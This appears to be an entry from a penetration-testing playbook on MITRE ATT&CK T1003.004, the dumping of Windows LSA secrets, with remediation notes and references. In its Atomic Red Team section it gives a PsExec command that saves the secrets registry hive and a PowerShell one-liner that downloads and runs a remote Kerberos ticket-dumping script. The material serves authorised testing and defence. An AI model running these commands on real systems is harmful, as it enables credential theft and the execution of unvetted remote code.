---
name: "T1003.004_lsa-secrets"
description: "Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service..."
category: "authentication"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1003.004
  - credential-access
  - windows
  - sub-technique
technique_id: "T1003.004"
tactic: "credential-access"
all_tactics:
  - credential-access
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1003/004"
tech_stack:
  - windows
cwe_ids:
  - CWE-522
chains_with:
  - T1003
  - T1003.001
  - T1003.002
  - T1003.003
  - T1003.005
  - T1003.006
  - T1003.007
  - T1003.008
prerequisites:
  - T1003
severity_boost:
  T1003: "Chain with T1003 for deeper attack path"
  T1003.001: "Chain with T1003.001 for deeper attack path"
  T1003.002: "Chain with T1003.002 for deeper attack path"
---

# T1003.004 LSA Secrets

> **Sub-technique of:** T1003

## High-Level Description

Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts. LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets</code>. LSA secrets can also be dumped from memory.

Reg can be used to extract from the Registry. Mimikatz can be used to extract secrets from memory.

## Kill Chain Phase

- Credential Access (TA0006)

**Platforms:** Windows

## What to Check

- [ ] Identify if LSA Secrets technique is applicable to target environment
- [ ] Check Windows systems for indicators of LSA Secrets
- [ ] Verify mitigations are bypassed or absent (3 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Dumping LSA Secrets

Dump secrets key from Windows registry
When successful, the dumped file will be written to $env:Temp\secrets.
Attackers may use the secrets key to assist with extracting passwords and enumerating other sensitive system information.
https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/#:~:text=LSA%20Secrets%20is%20a%20registry,host%2C%20local%20security%20policy%20etc.

**Supported Platforms:** windows
**Elevation Required:** Yes

```cmd
"#{psexec_exe}" -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets /y
```

**Dependencies:**
- PsExec from Sysinternals must exist on disk at specified location (#{psexec_exe})

### Atomic Test 2: Dump Kerberos Tickets from LSA using dumper.ps1

This tool allows you to dump Kerberos tickets from the LSA cache. Implemented via Add-Type.
If the tool is run as a privileged user, it will automatically obtain NT AUTHORITY\SYSTEM privileges and then dump all tickets. If the tool is run as a non-privileged user, it will only dump tickets from the current logon session.
Ref: https://github.com/MzHmO/PowershellKerberos/
Author of dumper.ps1: Michael Zhmaylo (@MzHmO)

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to LSA Secrets by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1003.004 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1027 Password Policies
Ensure that local administrator accounts have complex, unique passwords across all systems on the network.

### M1026 Privileged Account Management
Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.

### M1017 User Training
Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts.


## Detection

### Detection of LSA Secrets Dumping via Registry and Memory Extraction


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| LSA Secrets technique applicable | High | Credential Access |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-522 | Insufficiently Protected Credentials |


## References

- [Tilbury Windows Credentials](https://www.first.org/resources/papers/conf2017/Windows-Credentials-Attacks-and-Mitigation-Techniques.pdf)
- [ired Dumping LSA Secrets](https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets)
- [Microsoft AD Admin Tier Model](https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material?redirectedfrom=MSDN)
- [Passcape LSA Secrets](https://www.passcape.com/index.php?section=docsys&cmd=details&id=23)
- [Powersploit](https://github.com/mattifestation/PowerSploit)
- [Atomic Red Team - T1003.004](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1003.004)
- [MITRE ATT&CK - T1003.004](https://attack.mitre.org/techniques/T1003/004)
